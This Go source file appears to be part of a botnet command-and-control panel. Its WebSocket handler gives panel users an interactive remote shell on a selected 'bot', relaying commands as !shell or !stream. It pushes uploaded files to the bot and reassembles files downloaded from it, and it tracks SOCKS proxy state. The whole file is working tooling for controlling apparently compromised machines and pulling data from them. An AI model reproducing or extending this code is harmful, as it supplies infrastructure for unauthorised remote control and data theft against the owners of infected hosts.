package main

import (
	"encoding/json"
	"net/http"
	"strings"
	"sync"

	"github.com/gorilla/websocket"
)

// ============================================================================
// WEB SHELL WEBSOCKET
// Provides real-time bidirectional shell access to bots via WebSocket.
// Web panel users click a bot row to open a terminal modal that connects here.
// ============================================================================

var upgrader = websocket.Upgrader{
	ReadBufferSize:  16 * 1024,   // 16KB for control frames and commands
	WriteBufferSize: 512 * 1024,  // 512KB for file download payloads
	CheckOrigin: func(r *http.Request) bool {
		// Only allow same-origin WebSocket connections
		origin := r.Header.Get("Origin")
		if origin == "" {
			return true // non-browser clients (curl, etc.) don't send Origin
		}
		host := r.Host
		// Accept if origin matches the request host
		return strings.HasSuffix(origin, "://"+host)
	},
}

// safeWS wraps a websocket.Conn with a mutex for write serialization.
// gorilla/websocket requires that concurrent writes are serialized.
type safeWS struct {
	conn *websocket.Conn
	mu   sync.Mutex
}

func (s *safeWS) writeJSON(v interface{}) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.conn.WriteJSON(v)
}

// fileAccum holds in-progress file download state per bot.
type fileAccum struct {
	name string
	data strings.Builder
}

var (
	webShellConns     = make(map[string][]*safeWS)
	webShellConnsLock sync.RWMutex

	// webShellCwd tracks the working directory per bot for web shell sessions.
	webShellCwd     = make(map[string]string)
	webShellCwdLock sync.RWMutex

	// webShellPendingCd tracks bots that have a cd+pwd in flight.
	// When the next output arrives and is an absolute path, update cwd.
	webShellPendingCd     = make(map[string]bool)
	webShellPendingCdLock sync.Mutex

	// webShellFileAccum tracks in-progress file downloads per bot.
	webShellFileAccum     = make(map[string]*fileAccum)
	webShellFileAccumLock sync.Mutex
)

func registerWebShell(botID string, ws *safeWS) {
	webShellConnsLock.Lock()
	defer webShellConnsLock.Unlock()
	webShellConns[botID] = append(webShellConns[botID], ws)
}

func unregisterWebShell(botID string, ws *safeWS) {
	webShellConnsLock.Lock()
	defer webShellConnsLock.Unlock()
	conns := webShellConns[botID]
	for i, c := range conns {
		if c == ws {
			webShellConns[botID] = append(conns[:i], conns[i+1:]...)
			break
		}
	}
	if len(webShellConns[botID]) == 0 {
		delete(webShellConns, botID)
	}
}

// forwardBotOutputToWebShells routes non-streaming bot output to web shell connections.
// Intercepts __FILE_START__/__FILE_END__ markers to assemble file download payloads,
// and updates tracked cwd when a cd+pwd is pending.
func forwardBotOutputToWebShells(botID, output string) {
	// If a cd+pwd is pending, capture the resolved path to update cwd
	webShellPendingCdLock.Lock()
	pending := webShellPendingCd[botID]
	if pending {
		delete(webShellPendingCd, botID)
	}
	webShellPendingCdLock.Unlock()
	if pending {
		resolved := strings.TrimSpace(output)
		if idx := strings.Index(resolved, "\n"); idx != -1 {
			resolved = strings.TrimSpace(resolved[:idx])
		}
		if strings.HasPrefix(resolved, "/") {
			webShellCwdLock.Lock()
			webShellCwd[botID] = resolved
			webShellCwdLock.Unlock()
		}
	}

	trimmed := strings.TrimSpace(output)

	// --- File transfer: START marker ---
	// Bot sends: __FILE_START__<filename>\n<base64>\n__FILE_END__
	if strings.HasPrefix(trimmed, "__FILE_START__") {
		rest := strings.TrimPrefix(trimmed, "__FILE_START__")
		nlIdx := strings.Index(rest, "\n")
		if nlIdx < 0 {
			nlIdx = len(rest)
		}
		fname := rest[:nlIdx]
		payload := ""
		if nlIdx < len(rest) {
			payload = rest[nlIdx+1:]
		}
		endIdx := strings.Index(payload, "\n__FILE_END__")
		if endIdx >= 0 {
			// Complete file arrived in one message
			sendWebShellFile(botID, fname, strings.TrimSpace(payload[:endIdx]))
		} else {
			// File spans multiple messages; accumulate
			webShellFileAccumLock.Lock()
			webShellFileAccum[botID] = &fileAccum{name: fname}
			if payload != "" {
				webShellFileAccum[botID].data.WriteString(payload)
			}
			webShellFileAccumLock.Unlock()
			sendWebShellOutput(botID, "[download] receiving "+fname+"...\n")
		}
		return
	}

	// --- File transfer: END marker (multi-message path) ---
	if trimmed == "__FILE_END__" {
		webShellFileAccumLock.Lock()
		accum := webShellFileAccum[botID]
		delete(webShellFileAccum, botID)
		webShellFileAccumLock.Unlock()
		if accum != nil {
			sendWebShellFile(botID, accum.name, accum.data.String())
		}
		return
	}

	// --- Accumulating file data ---
	webShellFileAccumLock.Lock()
	accum := webShellFileAccum[botID]
	webShellFileAccumLock.Unlock()
	if accum != nil {
		webShellFileAccumLock.Lock()
		accum.data.WriteString(trimmed)
		webShellFileAccumLock.Unlock()
		return
	}

	sendWebShellOutput(botID, output)
}

// sendWebShellOutput sends a plain output message to all web shell connections for a bot.
func sendWebShellOutput(botID, output string) {
	webShellConnsLock.RLock()
	conns := webShellConns[botID]
	if len(conns) == 0 {
		webShellConnsLock.RUnlock()
		return
	}
	snapshot := make([]*safeWS, len(conns))
	copy(snapshot, conns)
	webShellConnsLock.RUnlock()

	msg := map[string]string{
		"type":   "output",
		"botID":  botID,
		"output": output,
	}

	var dead []*safeWS
	for _, ws := range snapshot {
		if err := ws.writeJSON(msg); err != nil {
			dead = append(dead, ws)
		}
	}
	for _, ws := range dead {
		unregisterWebShell(botID, ws)
		ws.conn.Close()
	}
}

// sendWebShellStreamMsg sends a typed streaming message (stream_stdout, stream_stderr,
// stream_start, stream_done) to all web shell connections for a bot.
func sendWebShellStreamMsg(botID string, msg map[string]interface{}) {
	webShellConnsLock.RLock()
	conns := webShellConns[botID]
	if len(conns) == 0 {
		webShellConnsLock.RUnlock()
		return
	}
	snapshot := make([]*safeWS, len(conns))
	copy(snapshot, conns)
	webShellConnsLock.RUnlock()

	var dead []*safeWS
	for _, ws := range snapshot {
		if err := ws.writeJSON(msg); err != nil {
			dead = append(dead, ws)
		}
	}
	for _, ws := range dead {
		unregisterWebShell(botID, ws)
		ws.conn.Close()
	}
}

// sendWebShellFile delivers a completed file download to all web shell connections.
func sendWebShellFile(botID, filename, b64data string) {
	webShellConnsLock.RLock()
	conns := webShellConns[botID]
	if len(conns) == 0 {
		webShellConnsLock.RUnlock()
		return
	}
	snapshot := make([]*safeWS, len(conns))
	copy(snapshot, conns)
	webShellConnsLock.RUnlock()

	msg := map[string]string{
		"type": "file",
		"name": filename,
		"data": b64data,
	}

	var dead []*safeWS
	for _, ws := range snapshot {
		if err := ws.writeJSON(msg); err != nil {
			dead = append(dead, ws)
		}
	}
	for _, ws := range dead {
		unregisterWebShell(botID, ws)
		ws.conn.Close()
	}

	sendWebShellOutput(botID, "[download] file ready: "+filename+"\n")
}

// handleWebShellWS is the WebSocket endpoint for the remote shell modal.
// Auth enforced by requireWebAuth middleware in NewWebMux.
func handleWebShellWS(w http.ResponseWriter, r *http.Request) {
	botID := strings.TrimSpace(r.URL.Query().Get("botID"))
	if botID == "" {
		http.Error(w, "Missing botID", http.StatusBadRequest)
		return
	}

	// Resolve full bot ID (supports prefix matching)
	bot := findBotByID(botID)
	if bot == nil {
		http.Error(w, "Bot not found", http.StatusNotFound)
		return
	}
	botID = bot.botID

	wsConn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

	// Allow up to 16MB messages for file uploads (10MB file ≈ 13.3MB base64 + JSON overhead)
	wsConn.SetReadLimit(16 * 1024 * 1024)

	ws := &safeWS{conn: wsConn}
	registerWebShell(botID, ws)
	// Intentionally do NOT reset webShellCwd — cwd persists across
	// shell open/close for session continuity.
	defer func() {
		unregisterWebShell(botID, ws)
		wsConn.Close()
	}()

	// Read loop: receive commands from the web shell
	for {
		_, msgBytes, err := wsConn.ReadMessage()
		if err != nil {
			break
		}

		var msg struct {
			Command  string `json:"command"`
			Type     string `json:"type"`
			FileName string `json:"fileName"`
			Data     string `json:"data"`
			Stream   bool   `json:"stream"`
		}
		if err := json.Unmarshal(msgBytes, &msg); err != nil {
			continue
		}

		// Handle file upload from browser → relay to bot as !upload
		if msg.Type == "upload" && msg.FileName != "" && msg.Data != "" {
			sendToSingleBot(botID, "!upload "+msg.FileName+" "+msg.Data)
			continue
		}

		cmd := strings.TrimSpace(msg.Command)
		if cmd == "" {
			continue
		}

		// Auto-prefix with !shell or !stream for non-! commands
		if !strings.HasPrefix(cmd, "!") {
			// cd always uses blocking !shell so pwd output can update cwd tracking
			if strings.HasPrefix(cmd, "cd ") || cmd == "cd" {
				dir := strings.TrimSpace(strings.TrimPrefix(cmd, "cd"))
				if dir == "" || dir == "~" {
					dir = "$HOME"
				}
				webShellCwdLock.RLock()
				cur := webShellCwd[botID]
				webShellCwdLock.RUnlock()
				var cdCmd string
				if cur != "" {
					cdCmd = "cd " + shellQuote(cur) + " && cd " + shellQuote(dir) + " && pwd && echo '---LS---' && ls -laF"
				} else {
					cdCmd = "cd " + shellQuote(dir) + " && pwd && echo '---LS---' && ls -laF"
				}
				cmd = "!shell " + cdCmd
				webShellPendingCdLock.Lock()
				webShellPendingCd[botID] = true
				webShellPendingCdLock.Unlock()
			} else {
				webShellCwdLock.RLock()
				cwd := webShellCwd[botID]
				webShellCwdLock.RUnlock()
				prefix := "!shell "
				if msg.Stream {
					prefix = "!stream "
				}
				if cwd != "" {
					cmd = prefix + "cd " + shellQuote(cwd) + " && " + cmd
				} else {
					cmd = prefix + cmd
				}
			}
		}

		// For !download with relative paths, prepend tracked cwd
		if strings.HasPrefix(cmd, "!download ") {
			parts := strings.SplitN(cmd, " ", 2)
			if len(parts) == 2 && parts[1] != "" && !strings.HasPrefix(parts[1], "/") {
				webShellCwdLock.RLock()
				cwd := webShellCwd[botID]
				webShellCwdLock.RUnlock()
				if cwd != "" {
					cmd = "!download " + cwd + "/" + parts[1]
				}
			}
		}

		sendToSingleBot(botID, cmd)
		trackSocksState(cmd, botID)
	}
}

// shellQuote wraps a path in single quotes for safe shell interpolation.
// $HOME is left unquoted so the shell expands it.
func shellQuote(s string) string {
	if s == "$HOME" {
		return s
	}
	return "'" + strings.ReplaceAll(s, "'", "'\"'\"'") + "'"
}
